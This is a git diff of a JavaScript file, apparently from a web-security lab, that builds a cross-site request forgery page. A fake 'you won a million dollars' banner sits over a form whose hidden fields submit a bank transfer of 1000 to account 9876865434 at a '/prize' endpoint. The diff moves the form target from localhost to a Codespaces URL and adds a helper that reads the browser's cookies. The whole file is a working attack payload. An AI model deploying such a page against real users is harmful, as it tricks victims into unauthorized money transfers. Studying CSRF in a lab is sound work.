@@ -1,7 +1,7 @@
 document.addEventListener('DOMContentLoaded', () => {
 
     const html = "<h1>Congratulations. You just won a bonus of 1 million dollars!!!</h1>" + 
-    "<form action=\"http://localhost:3001/prize\" method=\"post\">" + 
+    "<form action=\"https://supreme-meme-7j6v5x4qqr3w69g-3001.app.github.dev/prize\" method=\"post\">" + 
     "<input type=\"hidden\" name=\"TransferAccount\" value=\"9876865434\" />" +
     "<input type=\"hidden\" name=\"Amount\" value=\"1000\" />" +
     "<input type=\"submit\" value=\"Click here to claim your bonus\"/>" +
@@ -15,3 +15,10 @@ document.addEventListener('DOMContentLoaded', () => {
         document.body.appendChild(child);
     }
 })
+
+function getCookie(cookiename) 
+{
+    var cookiestring=RegExp(cookiename+"=[^;]+").exec(document.cookie);
+    
+    return decodeURIComponent(!!cookiestring ? cookiestring.toString().replace(/^[^=]+./,"") : "");
+}
